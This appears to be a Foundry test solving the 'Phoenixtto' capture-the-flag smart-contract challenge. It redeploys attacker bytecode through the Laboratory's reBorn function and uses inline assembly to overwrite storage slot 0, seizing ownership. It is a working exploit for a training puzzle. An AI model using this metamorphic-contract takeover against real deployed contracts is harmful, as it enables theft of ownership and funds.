// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../src/ChallengePhoenixtto.sol";
import "forge-std/Test.sol";

contract ChallengePhoenixttoTest is Test {
    Laboratory laboratory;
    Phoenixtto phoenixtto;

    function setUp() external {
        laboratory = new Laboratory(address(this));
    }

    function testAttack() external {
        laboratory.reBorn(type(PhoenixttoCatcher).creationCode);
        PhoenixttoCatcher(laboratory.addr()).capturePhoenixtto(address(this));
        require(laboratory.isCaught(), "NOT CAUGHT");
    }
}

contract PhoenixttoCatcher {
    function owner() public returns (address) {
        assembly {
            let ownerOfPhoenixtto := sload(0)
            ownerOfPhoenixtto := shl(12, ownerOfPhoenixtto)
            ownerOfPhoenixtto := shr(12, ownerOfPhoenixtto)
            mstore(0x0, ownerOfPhoenixtto)
            return(0x0, 32)
        }
    }

    function reBorn() external {}

    function capturePhoenixtto(address newOwner) external {
        assembly {
            let payload := 1
            payload := shl(20, payload)
            payload := or(payload, newOwner)
            sstore(0, payload)
        }
    }
}
